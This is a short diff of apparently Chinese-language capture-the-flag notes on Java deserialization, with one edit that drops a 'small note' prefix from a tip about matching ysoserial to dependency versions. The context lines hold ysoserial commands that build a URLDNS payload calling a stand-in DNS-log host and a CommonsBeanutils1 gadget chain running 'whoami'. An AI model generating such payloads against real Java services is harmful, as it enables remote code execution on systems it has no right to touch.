@@ -18,4 +18,4 @@ java -jar ysoserial.jar URLDNS "http://example.dnslog" > dns.bin
 java -jar ysoserial.jar CommonsBeanutils1 "whoami" | base64 -w0
 ```
 
-小记录：ysoserial 要和依赖版本匹配。比赛里常先用 URLDNS 验证触发，再考虑更重的链。
+ysoserial 要和依赖版本匹配。比赛里常先用 URLDNS 验证触发，再考虑更重的链。
